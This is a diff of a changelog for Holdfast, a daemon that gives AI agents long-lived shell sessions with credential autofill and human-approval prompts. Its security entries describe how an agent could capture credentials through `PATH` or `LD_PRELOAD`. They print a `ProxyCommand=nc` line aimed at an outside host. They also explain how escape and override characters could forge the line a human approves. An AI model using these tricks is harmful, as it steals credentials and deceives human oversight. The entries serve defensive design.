-  `match_command` scanner was: it enumerates the ways an adversary can
-  influence a process, and there is no complete list. So **`env` and `cwd` are
-  mutually exclusive with `profile`**, and a profile declares its own.
-
-  **Operators upgrading:** `start_session(profile:, env:)` and `(profile:,
-  cwd:)` are argument errors where both worked before. If a credentialed
-  workflow genuinely needs an environment, write it into
-  `[security.profiles.env]`, where the agent cannot reach it.
-
-  **What this does not close, stated plainly.** A profile bounds *which* command
-  line a credential can reach and *which* credential an agent can obtain. It
-  says nothing about the credential's **effect**: an agent that reaches a
-  profile-started session still obtains an interactive shell on the target once
-  injection succeeds, which is the feature working. And a slot pattern is still
-  the operator's to write.
-
+- **The operator writes the command line and the agent fills named slots in
+  it** ([#46], closing [#45]). This retires the bypass class rather than
+  mitigating it: `match_command`, `match_example` and the load-time corpus that
+  judged one against the other are gone. Substitution happens within one argv
+  element, so a value containing spaces, quotes, `;`, `&&` or a leading `-`
+  stays a single argument and cannot become a second one.
+- **Each profile rule is a load error naming the key.** `program`, `env` (keys
+  and values) and `cwd` are literals and admit no `{…}`; every `{name}` in
+  `args` has a `vars` entry and every `vars` entry is used by a slot; each var
+  pattern compiles wrapped exactly as the renderer wraps it; profile names are
+  unique; and a binding naming an unknown profile is refused.
+- **`env` and `cwd` are mutually exclusive with `profile`**, so the agent
+  chooses no part of the process. `env: {PATH: …}` repointed a profile whose
+  literal `program` was `ssh` at the agent's own binary, and
+  `env: {LD_PRELOAD: …}` captured the credential out of an absolute-path
+  program running the operator's own argv ([#55]).
 - **A session started with `command`/`args` can never receive a keychain
-  credential.** That is the safety property, and it is also a real capability
-  loss — both halves are true and this entry says both. An agent can only run
-  credentialed sessions the operator anticipated; an operator who forgets a
-  profile finds out when a legitimate workflow stops autofilling.
-
-- **`match_prompt` is unchanged, and is still not a security control.** It
-  narrowed within a `match_command` and it narrows within a profile: a
-  *conjunct*, so it can only remove candidates a selection already made. It gets
-  no load-time check of its own for the same three reasons — it cannot produce a
-  selection hole; `""` (the documented default) already means "does not select
-  on the prompt", so `.*` means what a permitted value means; and there is no
-  hostile-probe corpus to write, because **the agent chooses the child and
-  therefore chooses the prompt**.
-
-  What it is *for* is disambiguating between prompts inside a session that has
-  already matched: "this credential is for the login prompt, not the sudo
-  prompt".
-
-  **One oddity is recorded and not fixed.** `match_prompt` matches the
-  **unredacted** prompt line — deliberately, so the redactor cannot silently
-  switch an operator's binding off — and resolution success is observable by the
-  agent. An operator who wrote a `match_prompt` discriminating on *secret
-  content* would turn resolve/no-resolve into a one-bit oracle over text the
-  redactor exists to hide. It takes the operator to author it, so it is bounded;
-  it is written down chiefly as a warning to anyone who later proposes matching
-  the **redacted** line "for safety", which reintroduces the exact defect the
-  unredacted match prevents.
-
-- **`BindingApprovalRequired` carries the session's command line**, so a human
-  approves *this command line receiving this credential* rather than a binding
-  name. `prod-ssh` reads identically whether the session is `ssh prod-01` or
-  `ssh prod-01 -o ProxyCommand=nc 127.0.0.1 2222`, and telling those apart is
-  the whole of the decision being asked for. `holdfast attach` and `holdfast
-  watch` both print it. The field is `command` and `args` joined with single
-  spaces, **redacted element-wise before the join, and stripped of every
-  character that could rewrite the line it is printed on** — the frame reaches
-  every attached client and those two fields are the agent's own strings.
-
-  The strip is not tidying. An argument containing `\x1b[2K` or `\r` lets the
-  agent erase or overwrite the very line the operator is being asked to decide
-  from, and forge the text around it — which defeats the field rather than
-  weakening it. Every control character goes, and so do the directional-override
-  and zero-width characters: U+202E reverses the rendering of everything after
-  it, which is the same attack in another alphabet.
-
-  **What is *not* removed is the text itself.** An escape sequence loses its
-  `\x1b` and what remains — `[2K`, `]0; -o ProxyCommand=…` — stays on screen as
-  the visible nonsense it is, so an operator sees a **longer, stranger** line
-  and never a shorter innocent one. That distinction is the whole point and it
-  was briefly the other way round: a first cut routed the field through the
-  terminal-stream ANSI stripper, which *consumes* OSC/DCS/APC payloads, so
-  `ssh prod-01\x1b]0; -o ProxyCommand=nc 1.2.3.4 22\x07` rendered as exactly
-  `ssh prod-01` — an argument deleted outright, which is this feature inverted.
-
-  The same treatment is applied to `AwaitingSecret.prompt_text` and
-  `BindingApprovalRequired.prompt_text`, which are agent-authored too and reach
-  a worse surface: `holdfast attach` writes that field to the terminal
-  unmodified.
-
-  This is mitigation and not a fix: it does nothing for
-  `autofill_on_echo_off`, which is the unattended case, and it asks a person to
-  read a long line. It is additive on the attach protocol. **It was recorded by
-  correcting `1.0.golden` in place rather than by bumping the minor**, on the
-  argument that nothing had been distributed speaking 1.0; that argument, and
-  the fact that the protocol has since moved to 1.1 for an unrelated change, are
-  both in `tests/wire_shape.rs`.
-
-- **`require_confirm` now defaults to `true`.** It defaulted to `false`, which
-  made silent resolution the shape an operator got by leaving a line out. A
-  binding that omits the key now resolves only after a human has seen the
-  command line; write `require_confirm = false` to get the old behaviour back.
-  `autofill_on_echo_off` still defaults `false` and stays there — one key
-  decides whether the credential store is consulted at all, the other whether a
-  human sees the command line first, and both defaults are the position that
-  requires somebody to have decided.
-
-- **What this does not close, stated because the code must not claim more than
-  it delivers.** An agent that can start the `prod-ssh` profile at all still
-  obtains the credential's *effect* — an interactive shell on the target — once
-  injection succeeds. What these rules take away is theft of the **bytes**, for
-  replay elsewhere and beyond the session's lifetime.
-
-  **The un-quoted-join straddle is gone with the join.** An earlier draft of
-  this entry recorded that `start_session("ssh prod-01", [])` presented the same
-  matching subject as `start_session("ssh", ["prod-01"])`, and named profiles as
-  a later milestone that would retire it. Profiles landed in this same release,
-  so nothing matches a joined command line any more and that residual is not a
-  residual — it is unrepresentable. The join survives only as
-  `BindingApprovalRequired.command_line`, which is a rendering shown to a human
-  and is matched against by nothing.
-
+  credential.** That is the safety property and it is also a real capability
+  loss: an operator who forgets a profile finds out when a legitimate workflow
+  stops autofilling.
+- **`match_prompt` is unchanged, and is still not a security control.** It is a
+  conjunct that can only remove candidates a selection already made. It matches
+  the unredacted prompt line deliberately, so the redactor cannot switch an
+  operator's binding off — matching the redacted line "for safety" would
+  reintroduce exactly that.
+- **`BindingApprovalRequired` carries the session's command line**, redacted
+  element-wise and then stripped of every control, directional-override and
+  zero-width character, so an argument cannot rewrite the line the operator is
+  deciding from. The text itself stays, so a forged line reads longer and
+  stranger and never shorter and innocent.
+- **`require_confirm` now defaults to `true`**, so a binding that omits the key
+  resolves only after a human has seen the command line. `autofill_on_echo_off`
+  still defaults to `false`.
+- **What this does not close, stated plainly.** A profile bounds which command
+  line a credential can reach and which credential an agent can obtain; it says
+  nothing about the credential's effect. What these rules take away is theft of
+  the bytes, for replay elsewhere and beyond the session's lifetime.
 - **Every tool's `outputSchema` advertises eleven statuses where it advertised
-  eight.** `secret_provided` and `secret_cancelled` join after `session_died`,
-  and `not_supported_on_platform` after `spawn_failed` — inserted at their
-  catalogue positions rather than appended, because that array's order is a wire
-  fact. Enum widening is backward-compatible for a validating client, but the
-  schema is a surface MCP clients cache, and three of the eleven are statuses
-  any given pre-0.0.7 tool can never return.
+  eight.** `secret_provided` and `secret_cancelled` join after `session_died`
+  and `not_supported_on_platform` after `spawn_failed`, inserted at their
+  catalogue positions because that array's order is a wire fact.
 
-## [0.0.6] — 2026-08-19
-
-**"Human-Observable" stops being an aspiration.** 0.0.5's changelog said the
-attach and watch surfaces "that would make it true are still future work". This
-is that work: a second Unix socket carrying a live terminal stream to human
-clients, alongside the MCP surface the agent uses, on the same sessions at the
-same time.
+## [0.0.6] — 2026-08-19 (Bolt)
 
 ### Added
 
@@ -1232,172 +243,114 @@ same time.
   tmux-style detach (`Ctrl-B d`). What the agent sees, you see, and you can
   type into the same shell.
 - **`holdfast watch <session>`** — the same stream read-only. It cannot send a
-  write frame at all: the refusal is a server-side frame-kind table checked
-  before every arm, not a client-side politeness.
-- **A per-connection redaction role.** An observer's stream is redacted; an
-  interactive client's is not. The decision reads the connection's *role* and
-  never `client_kind`, which is audit attribution only — a rule that was prose
-  until this milestone and is now a test that dies under a carve-out in either
-  direction.
-- **Streaming redaction**, which had to solve a problem the batch redactor did
-  not: a secret split across chunk boundaries in a stream that cannot be
-  rewound. It withholds an unterminated match rather than emitting it, which
-  makes it *stronger* than the read path over the first ~24 KiB.
+  write frame at all: the refusal is a server-side frame-kind table, not a
+  client-side politeness.
+- **A per-connection redaction role.** An observer's stream is redacted, an
+  interactive client's is not, and the decision reads the connection's role and
+  never `client_kind`, which is audit attribution only.
+- **Streaming redaction**, which withholds an unterminated match rather than
+  emitting it — making it stronger than the read path over the first ~24 KiB.
 - **`SecretInput`** — a password typed into an attached client reaches the
-  child's PTY without crossing the MCP wire, without appearing in any other
-  client's stream, and without an audit entry carrying its content. The prompt
-  is detected from termios `ECHO`, not from matching the word `Password:`.
+  child's PTY without crossing the MCP wire, entering another client's stream,
+  or appearing in an audit entry. The prompt is detected from termios `ECHO`,
+  not from matching the word `Password:`.
 - **`SessionExited`, `Detached` and `AwaitingSecret` frames**, so a client is
   told why a stream ended rather than discovering it by silence.
 
 ### Changed
 
-- **The GitHub repository is now `Sertelegger/holdfast`.** The v0.0.5 notes
-  recorded the slug as deliberately unchanged; it changed immediately after
-  that tag. Old URLs redirect, but `Cargo.toml`'s `repository` field does not
-  benefit from a redirect, so it moved too.
-- **Renamed from CLASP to Holdfast.** *This shipped inside the `v0.0.5` tag* —
-  it is recorded here because the section was written after that tag was cut,
-  and because nothing was ever released under the old name, so it is history
-  rather than an upgrade step. The project was *CLASP — Claude's Live
-  Agent Shell Proxy*; it is now **HOLDFAST — Human-Observable Long-lived Daemon
-  For Agent Shell Terminals**.
-
-  The rename is not only cosmetic. Everything below changes behaviour:
-
-  - **Crates and binary.** `clasp-core` → `holdfast-core`, `clasp` →
-    `holdfast`. The installed binary is `holdfast`; re-register it with
+- **The GitHub repository is now `Sertelegger/holdfast`.** Old URLs redirect,
+  but `Cargo.toml`'s `repository` field does not benefit from a redirect, so it
+  moved too.
+- **Renamed from CLASP to Holdfast** — *HOLDFAST, Human-Observable Long-lived
+  Daemon For Agent Shell Terminals*. This shipped inside the `v0.0.5` tag and
+  nothing was ever released under the old name. Everything below changes
+  behaviour, and there is no migration shim:
+  - `clasp-core` → `holdfast-core`, `clasp` → `holdfast`; re-register with
     `claude mcp add --scope user holdfast -- <path>/holdfast mcp`.
-  - **MCP identity.** `serverInfo.name` is now `holdfast`.
-  - **MCP resource URIs.** `clasp://session/…` → `holdfast://session/…`, and
-    the response `_meta` namespace key `clasp` → `holdfast`.
-  - **Control protocol.** The handshake method `clasp/handshake` →
-    `holdfast/handshake`. `PROTOCOL_MAJOR`/`PROTOCOL_MINOR` are unchanged; a
-    daemon and a shim from different sides of this rename will not speak, which
-    is fine because nothing was released.
-  - **OSC 133 marker tag.** Injected markers now carry `;holdfast=1` instead of
-    `;clasp=1`, the injected shell functions are `__holdfast_*`, and the
-    `osc133_source` value `clasp` is now `holdfast`.
-  - **Runtime directory.** `~/.clasp` → `~/.holdfast`,
-    `$XDG_RUNTIME_DIR/clasp` → `$XDG_RUNTIME_DIR/holdfast`,
-    `~/Library/Application Support/clasp` → `.../holdfast`, `clasp.pid` →
-    `holdfast.pid`, `clasp.lock` → `holdfast.lock`. **There is no migration
-    shim.** A stale `~/.clasp` from a development build is orphaned, not moved:
-    read anything you still want out of `~/.clasp/logs/audit.log` and delete
-    the directory.
-  - **Config file.** `$XDG_CONFIG_HOME/clasp/config.toml` →
-    `.../holdfast/config.toml` (likewise `~/.config/clasp` →
-    `~/.config/holdfast`). An existing config file is not read from the old
-    path; move it.
-  - **Environment variables.** `CLASP_RUNTIME_DIR` → `HOLDFAST_RUNTIME_DIR`,
-    `CLASP_BUILD_SHA` → `HOLDFAST_BUILD_SHA`, `CLASP_SHELL_INTEGRATION` →
-    `HOLDFAST_SHELL_INTEGRATION`. The old names are not read as a fallback.
-
-  Unchanged on purpose: the protocol version numbers, the socket filenames
-  (`control.sock`, `attach.sock`, `http.sock`), the log filenames, the
-  `sess_` session-id prefix, every MCP tool name, and the GitHub repository
-  slug.
+  - `serverInfo.name` is now `holdfast`.
+  - `clasp://session/…` → `holdfast://session/…`, and the response `_meta`
+    namespace key `clasp` → `holdfast`.
+  - `clasp/handshake` → `holdfast/handshake`; a daemon and a shim from
+    different sides of the rename will not speak.
+  - OSC 133 markers carry `;holdfast=1`, the injected shell functions are
+    `__holdfast_*`, and `osc133_source` reports `holdfast`.
+  - `~/.clasp` → `~/.holdfast`, `$XDG_RUNTIME_DIR/clasp` → `.../holdfast`,
+    `~/Library/Application Support/clasp` → `.../holdfast`, and
+    `clasp.pid`/`clasp.lock` → `holdfast.pid`/`holdfast.lock`. A stale
+    `~/.clasp` is orphaned, not moved.
+  - `$XDG_CONFIG_HOME/clasp/config.toml` → `.../holdfast/config.toml`
+    (likewise `~/.config/clasp` → `~/.config/holdfast`); an existing config is
+    not read from the old path.
+  - `CLASP_RUNTIME_DIR`, `CLASP_BUILD_SHA` and `CLASP_SHELL_INTEGRATION` →
+    `HOLDFAST_*`; the old names are not read as a fallback.
+  - Unchanged on purpose: the protocol version numbers, the socket filenames
+    (`control.sock`, `attach.sock`, `http.sock`), the log filenames, the
+    `sess_` session-id prefix, and every MCP tool name.
 
 ### Fixed
 
-- **Four smoke checks passed against a server that never started, and 0.0.5's
-  fix for the same class did not hold.** 0.0.5 recorded that "the script now
-  reports its own check count, so the number in the documentation cannot drift
-  away from it again". It drifted again immediately: reporting the total does
-  nothing about the *transcribed* copies, and the attach phase shipped 47
-  checks while the script's own header and `CONTRIBUTING.md` both still said
-  38. The four survivors were three different defects — one row asserted the
-  script's own setup and could not fail under any server; one asserted the
-  *absence* of `http.sock`, which an empty directory satisfies; and two
-  asserted only that `holdfast attach` / `holdfast watch` exited 0, which
-  `/bin/true` also does. Each is repaired in kind: a precondition became an
-  `exit`, the absence gained the positive that witnesses it, and the two client
-  rows now assert output only a live session can have produced. The durable
-  part is that **the invariant no longer carries a number** — it is `F == N`,
-  which no added check can make stale — and that CI now runs the negative
-  control instead of a sentence claiming someone could.
+- **Four smoke checks passed against a server that never started**, and 0.0.5's
+  fix for the same class did not hold — reporting the total does nothing about
+  the transcribed copies, and the attach phase shipped 47 checks while the
+  script's header and `CONTRIBUTING.md` both still said 38. The invariant no
+  longer carries a number (`F == N`), and CI runs the negative control.
 
-## [0.0.5] — 2026-08-19
+## [0.0.5] — 2026-08-19 (Anchor)
 
-**The first tagged release.** Until now the workspace version sat at `0.0.2`
-and had not tracked the milestone number since — a placeholder rather than a
-published artifact — so a build would have reported `0.0.2` and written it into
-`holdfast.pid`. The version and the milestone agree from here.
-
-Milestones 0.0.1 through 0.0.5 are all in this release; there was no earlier
-tag, nothing on crates.io, and no distributed binary. The sections below are
-grouped by milestone because that is how the work was built and reviewed, not
-because each shipped separately.
-
-Every milestone here was built task by task from self-contained briefs, each
-task reviewed against its brief and then again as a whole branch — which is why
-the "Fixed" section names classes of defect rather than issue numbers.
-
-Milestones 0.0.3 and 0.0.4 were merged before they had sections here; they were
-backfilled from their commit history rather than reconstructed from memory.
+**The first tagged release.** Milestones 0.0.1 through 0.0.5 are all in it;
+there was no earlier tag, nothing on crates.io and no distributed binary. The
+workspace version had sat at `0.0.2` and now tracks the milestone number.
+`Added` is grouped by milestone because that is how the work was built and
+reviewed, and `Fixed` names classes of defect rather than issue numbers because
+each was found by reviewing a task against its brief.
 
 ### Added
 
 #### Milestone 0.0.1 — skeleton and PTY
 
-- **A working stdio MCP server** (`rmcp`) with four tools: `start_session`,
-  `read_output`, `send_input`, `terminate`. Single Cargo workspace —
-  `holdfast-core` (library) and `holdfast` (binary, subcommands `mcp` and `version`).
-- **`InProcessPty`**, a `portable-pty`-backed PTY behind a `PtyBackend` trait,
+- **A working stdio MCP server** (`rmcp`) with four tools — `start_session`,
+  `read_output`, `send_input`, `terminate` — in a single workspace of
+  `holdfast-core` and `holdfast` (subcommands `mcp` and `version`).
+- **`InProcessPty`**, a `portable-pty` backend behind a `PtyBackend` trait,
   with `setsid()` and the PTY as controlling terminal so the child's process
-  group, session id and PID coincide. The trait exists so later milestones can
-  vary the isolation model without touching session logic; `MockPty` implements
-  it for tests.
+  group, session id and PID coincide. `MockPty` implements the trait for tests.
 - **`OutputBuffer`** with absolute-offset cursors, so an agent can carry a
   cursor between `read_output` calls and know exactly what it has and has not
-  seen, including when the ring has evicted the bytes it asked for.
-- **`Session` and `SessionRegistry`** — a dedicated reader thread per session so
-  blocking PTY reads never occupy a tokio worker, live-name uniqueness (an
-  exited session releases its name but keeps its id and its output buffer), a
-  concurrency cap of 8 live sessions, and a 1 MiB buffer each.
-- **`scripts/mcp-smoke.sh`** — an end-to-end smoke test that drives raw JSON-RPC
-  through the real server and asserts on shell-evaluated output. It is the only
-  check in the project that exercises the wire format.
+  seen, including when the ring has evicted it.
+- **`Session` and `SessionRegistry`** — a dedicated reader thread per session,
+  live-name uniqueness, a cap of 8 live sessions, and a 1 MiB buffer each.
+- **`scripts/mcp-smoke.sh`**, an end-to-end smoke test over raw JSON-RPC and
+  the only check in the project that exercises the wire format.
 
 #### Milestone 0.0.2 — deterministic prompt detection
 
-- **Sessions now report what the program is doing, with the evidence.** Every
-  prompt-bearing response carries an `interaction_mode` — `AtPrompt`,
-  `Executing`, `AwaitingSecret`, `Fullscreen`, `Exited` — and a
-  `detection_tier` saying how that was reached: `semantic` (OSC 133 markers),
-  `terminal_mode` (bracketed paste, alternate screen, termios `ECHO`), or
-  `heuristic` (output quiescence combined with a prompt-pattern score). The tier
-  is there so an agent can tell a measurement from a guess.
-- **A tier-A byte scanner** — a bounded state machine over the raw PTY stream
-  tracking bracketed paste, the alternate screen, the window title and OSC 133
-  markers. It allocates no grid and keeps no history beyond a 512-byte tail
-  line, so it runs unconditionally on every chunk, and it resynchronises on
-  malformed sequences rather than letting one swallow the session.
-- **Termios `ECHO` sampled through `PtyBackend`**, read from the master with
-  `tcgetattr`, which is what makes a genuine secret prompt distinguishable from
-  ordinary output that happens to end in `Password:`.
+- **Sessions report what the program is doing, with the evidence.** Every
+  prompt-bearing response carries an `interaction_mode` (`AtPrompt`,
+  `Executing`, `AwaitingSecret`, `Fullscreen`, `Exited`) and a `detection_tier`
+  (`semantic`, `terminal_mode`, `heuristic`), so an agent can tell a
+  measurement from a guess.
+- **A tier-A byte scanner** over the raw PTY stream — bracketed paste, the
+  alternate screen, the window title and OSC 133 markers — allocating no grid,
+  keeping a 512-byte tail line, and resynchronising on malformed sequences.
+- **Termios `ECHO` sampled through `PtyBackend`** with `tcgetattr` on the
+  master, which is what makes a genuine secret prompt distinguishable from
+  output that happens to end in `Password:`.
 - **A 22-row tier-3 prompt-pattern table**, nine rows carrying head guards
-  derived from measuring the table against 65 lines of ordinary build, test,
-  `git`, package-manager and `--help` output. Sessions may extend or replace it
-  via `start_session(prompt_patterns:)`.
+  measured against 65 lines of ordinary build, test, `git`, package-manager and
+  `--help` output. Sessions may extend or replace it via
+  `start_session(prompt_patterns:)`.
 - **OSC 133 shell integration for bash, zsh and fish** — a one-line snippet
-  **typed into the session at the first prompt, never installed**. There is
-  nothing to add to an rc file; the snippet wraps whatever `PS1` the shell ended
-  up with rather than replacing it, does nothing when the user's configuration
-  already emits OSC 133, and is not exported, so a nested shell is integrated in
-  its own right. Anything else — `dash`, a REPL, a plain program — degrades
-  silently to `terminal_mode` or `heuristic`. `shell_integration: false` skips
-  it.
+  typed into the session at the first prompt, never installed, wrapping
+  whatever `PS1` the shell ended up with. Anything else degrades silently to
+  `terminal_mode` or `heuristic`; `shell_integration: false` skips it.
 - **A command-history ring** built from those markers, recording each command's
-  exit code, start time, duration, and the byte span of its output, addressed in
-  the same cursor space `read_output` uses.
-- **Three new tools** — `status` (what one session is doing now),
-  `list_sessions` (every session, live or exited), and `get_command_history`.
-  The tool set is seven.
+  exit code, start time, duration and output span in the cursor space
+  `read_output` uses.
+- **`status`, `list_sessions` and `get_command_history`**, bringing the tool
+  set to seven.
 - **An `outputSchema` on every tool**, and the MCP 2025-06-18 annotations
-  (`readOnlyHint` / `destructiveHint` / `idempotentHint` / `openWorldHint`) on
-  each, so a client can validate what it gets back and reason about what a call
-  will do before making it.
+  (`readOnlyHint` / `destructiveHint` / `idempotentHint` / `openWorldHint`).
 - **Session options on `start_session`**: `cwd` (validated and canonicalised),
   `env`, `cols`/`rows`, `prompt_patterns`, `prompt_patterns_replace`,
   `settle_threshold_ms`, `shell_integration`.
@@ -1405,183 +358,118 @@ backfilled from their commit history rather than reconstructed from memory.
 #### Milestone 0.0.3 — output processing and redaction
 
 - **Secrets are removed from output by default.** A 51-rule set derived from
-  Gitleaks finds credentials in the byte stream and replaces each with a
-  `[REDACTED:<kind>]` marker naming the rule that matched. Every rule carries
-  positive *and* negative examples, and the loader rejects one that has neither
-  — a pattern nobody has watched fail is a pattern nobody has tested.
+  Gitleaks replaces each match with a `[REDACTED:<kind>]` marker naming the
+  rule; every rule carries positive *and* negative examples, and the loader
+  rejects one that has neither.
 - **A secret split across two reads is withheld rather than leaked in halves.**
-  A prefix index scans the trailing region for the start of any rule, and while
-  one is open the read stops short and reports `held_back: true`, resuming once
-  the bytes either complete a match or prove not to be one. `tail_lines` and
-  `tail_bytes` reads opt out of this by argument, and that per-call opt-in is
-  the licence — not the shape of the read.
+  A prefix index scans the trailing region, the read stops short and reports
+  `held_back: true`, and `tail_lines`/`tail_bytes` reads opt out by argument.
 - **ANSI stripping with a boundary rule**, so a sequence cut across a chunk
   boundary is not half-emitted as text, and **`text_encoding` modes** for
   callers that need the bytes rather than the rendering.
-- **An audit trail with mandatory redaction** (§9.4). Every string handed to the
-  log passes through the redactor first, so a session's own record cannot carry
-  the secret whose disclosure it is recording. `read_output(redact: false)`
-  returns the raw bytes and writes an entry saying so.
-- **`status` and `list_sessions` redact on the way out** — `command`, `args` and
-  `prompt.last_line` — and sessions gained `exited_at_unix_secs`.
-- **`wait_for_pattern`**, and `send_input(wait_for:)`, so an agent can block
-  until a regex matches new output instead of polling. The tool set is eight.
+- **An audit trail with mandatory redaction.** Every string handed to the log
+  passes through the redactor first; `read_output(redact: false)` returns the
+  raw bytes and writes an entry saying so.
+- **`status` and `list_sessions` redact on the way out** — `command`, `args`
+  and `prompt.last_line` — and sessions gained `exited_at_unix_secs`.
+- **`wait_for_pattern`, and `send_input(wait_for:)`**, bringing the tool set to
+  eight.
 
 #### Milestone 0.0.4 — screen state, resize, interrupt
 
-- **`get_screen_state`** renders what a full-screen program is actually showing.
-  A `vt100` parser maintains a grid seeded from the ring buffer, and the tool
-  returns either the whole screen or a `diff_from` delta against a revision the
-  caller already has.
+- **`get_screen_state`** renders what a full-screen program is actually
+  showing, whole or as a `diff_from` delta against a revision the caller holds.
 - **Tracking is adaptive, not always-on.** A Tier-A probe watches for the
-  signals that mean a program has taken over the screen — the alternate screen,
-  bracketed paste, a cursor-position report — and only then does the parser
-  start. A line-oriented shell session pays nothing, which §11.4 asserts under
-  load as `parsed_bytes == 0`.
-- **`resize` and `interrupt`** as tools, bringing the set to **eleven**. `resize`
-  reports the geometry read back from the session *after* the `ioctl`, not the
-  geometry requested, so a resize that did not take effect cannot report success.
-- **A cursor-position prompt sub-signal (T3c).** Where the heuristic tier
-  previously scored only the text of the last line, it now also scores where the
-  cursor is sitting, combined as `quiescent × max(pattern, cursor)`.
-- **Holdfast answers Primary Device Attributes** (`\x1b[?6c`, byte-exact, no
-  optional parameters), which is what stops a `fish` session stalling ~10 s at
-  startup waiting for a terminal that never replies. Measured: answering the
-  other three common probes while withholding DA1 changes nothing; answering
-  DA1 alone takes the stall from 10.04 s to 0.02 s. Replies are rate-limited,
-  are never a `send_input` audit event, and deliberately do not count as session
-  activity — otherwise a child querying in a loop would keep its session alive
-  for ever.
+  alternate screen, bracketed paste or a cursor-position report and only then
+  starts the parser, so a line-oriented shell session pays nothing.
+- **`resize` and `interrupt`**, bringing the set to eleven. `resize` reports
+  the geometry read back *after* the `ioctl`, so a resize that did not take
+  effect cannot report success.
+- **A cursor-position prompt sub-signal (T3c)**, combined as
+  `quiescent × max(pattern, cursor)`.
+- **Primary Device Attributes are answered** (`\x1b[?6c`, byte-exact), taking a
+  `fish` startup stall from 10.04 s to 0.02 s. Replies are rate-limited, are
+  never a `send_input` audit event, and do not count as session activity.
 
 #### Milestone 0.0.5 — the daemon and the control protocol
 
-- **Sessions no longer die with the MCP client.** `holdfast mcp` is now a thin
-  shim: on first use it auto-spawns a background `holdfast daemon`, and afterwards
-  it reconnects to the one already running. The daemon owns the PTYs, so
-  quitting and restarting Claude Code leaves every session alive, at the same
-  prompt, with its output buffer intact. `holdfast mcp --no-daemon` keeps the old
-  single-process behaviour, and is the shape the Windows build will reuse.
+- **Sessions no longer die with the MCP client.** `holdfast mcp` is a thin shim
+  that auto-spawns a background `holdfast daemon` and afterwards reconnects to
+  it, so quitting and restarting Claude Code leaves every session alive at the
+  same prompt. `--no-daemon` keeps the single-process behaviour.
 - **A versioned control protocol** over a Unix socket — length-prefixed CBOR
-  frames with a 16 MiB cap, a `holdfast/handshake` that both peers check, and the
-  §18.3 error catalogue. Mismatched protocol majors refuse to connect from
-  *either* side, so a protocol break cannot be papered over by one end being
-  lenient.
+  with a 16 MiB cap, a `holdfast/handshake` both peers check, and an error
+  catalogue. Mismatched protocol majors refuse to connect from *either* side.
 - **The daemon never opens a TCP listener.** The socket is Unix-domain only,
   its directory is `0700` and verified after creation, and every connection's
-  peer credentials are read with `SO_PEERCRED` and compared to the daemon's own
-  uid *before a single frame is parsed*. A credential that cannot be read fails
-  closed.
-- **New CLI subcommands** — `holdfast daemon run|start|stop|status`, `holdfast list`,
-  and `holdfast logs <session> [--tail N] [--raw]`, with §18.8's exit codes and
-  §3.2's idempotence contracts (`daemon start` on a running daemon and
-  `daemon stop` on a dead one both succeed and say so).
-- **The §9.4 caller is derived from the connection, never from the request.**
-  A read that disables redaction records two facts: `tool`, the mechanism, and
-  `client_kind`, the accountable party — taken from the uid-checked handshake,
-  so `holdfast logs --raw` is logged as `cli` and an agent's
-  `read_output(redact: false)` as `shim`. There is deliberately no argument an
-  agent could set to label itself as a human. `client_kind` is attribution
-  only; nothing in the read path branches on it.
+  `SO_PEERCRED` uid is compared to the daemon's own before a single frame is
+  parsed. A credential that cannot be read fails closed.
+- **New CLI subcommands** — `holdfast daemon run|start|stop|status`,
+  `holdfast list`, and `holdfast logs <session> [--tail N] [--raw]` — with
+  documented exit codes and idempotent `daemon start`/`daemon stop`.
+- **The audit caller is derived from the connection, never from the request.**
+  `tool` records the mechanism and `client_kind` the accountable party, taken
+  from the uid-checked handshake; there is deliberately no argument an agent
+  could set to label itself as a human, and nothing in the read path branches
+  on it.
 
 ### Fixed
 
-Corrections that were measured rather than assumed. Each names a class rather
-than a one-off:
-
-- **A single `killpg()` does not reach a shell's background jobs.** Job control
-  puts each in its own process group, so `terminate` swept the leader and left
-  orphans. Measured against real PTYs; `terminate` now enumerates and signals
-  every process group in the child's session, and interrupts target the
-  terminal's foreground group.
+- **A single `killpg()` does not reach a shell's background jobs.** `terminate`
+  now enumerates and signals every process group in the child's session, and
+  interrupts target the terminal's foreground group.
 - **`send_input`'s blocking write could wedge the entire server.** A raw-mode
-  child that stopped reading parked a tokio worker uncancellably, and each retry
-  took another — a handful of calls took down the whole MCP server, including
-  `terminate`, the only way out. The write now runs on the blocking pool under a
-  deadline with a 64 KiB payload cap, and the binary bounds its runtime shutdown
-  because Linux does not wake a parked pty-master writer when the slave closes.
+  child that stopped reading parked a tokio worker uncancellably, and each
+  retry took another. The write now runs on the blocking pool under a deadline
+  with a 64 KiB payload cap.
 - **`read_output` reported truncation that had not happened** — on both of its
   branches, at different times and for different reasons.
-- **A stale `ECHO` sample reported `AwaitingSecret` for ordinary commands.** The
-  50 ms cache paired a readline prompt's echo-off with the bracketed-paste-off
-  of the command just submitted, which is the exact signature of a secret
-  prompt: 0.95 confidence, and the documented response is to interrupt a human
-  for a password. For `sleep 5`. Measured at 267 spurious samples under load, 0
-  after. Fixed where the bad value was produced — the cache deleted, the sample
-  taken under the detector lock — rather than guarded downstream, because the
-  tempting guard (require a non-empty tail line) is a false negative on bash's
-  `read -s`, a genuine secret prompt that prints nothing.
-- **One concept had two spellings, twice.** The alternate screen was a second,
-  wider spelling of "terminal-mode tier available": a single alt-screen toggle
-  marked a session available for life, so a `dash` prompt reported `Executing`
-  at a live prompt with nothing able to clear it. The same shape then turned up
-  in the semantic dimension, where the OSC 133 flag was unpinned against
-  unmodelled subcommands. One concept, one spelling.
-- **The escape-sequence ceiling was a forgery guard that could not be one.** At
-  the trip point a huge well-formed sequence and a truncated one share a
-  byte-identical prefix, so no online rule can distinguish them. It is now
-  documented as a *blindness budget*, raised to 1 MiB so a routine sixel frame
-  no longer trips it, with its residual asserted at its real reach — including
-  an ESC-free sixel, which disproved the claim that accidental forgery needs an
-  `ESC`.
+- **A stale `ECHO` sample reported `AwaitingSecret` for ordinary commands**,
+  measured at 267 spurious samples under load and 0 after. Fixed where the bad
+  value was produced — the 50 ms cache deleted, the sample taken under the
+  detector lock — rather than guarded downstream.
+- **One concept had two spellings, twice.** A single alt-screen toggle marked a
+  session terminal-mode-available for life, and the same shape then turned up
+  in the semantic dimension with the OSC 133 flag unpinned.
+- **The escape-sequence ceiling was a forgery guard that could not be one**, and
+  is now documented as a *blindness budget*, raised to 1 MiB so a routine sixel
+  frame no longer trips it.
 - **A head guard silently zeroed recall for every numbered-host prompt** while
-  the corpus stayed green, because the corpus had `hostname% ` and no
-  `build01% `. Pattern rows are now pinned from both sides of the boundary they
-  draw, and the first sweep to do that passed for the wrong reason — witnessed
-  by an accepted false positive rather than by a real prompt — so it was redone.
+  the corpus stayed green, because it had `hostname% ` and no `build01% `.
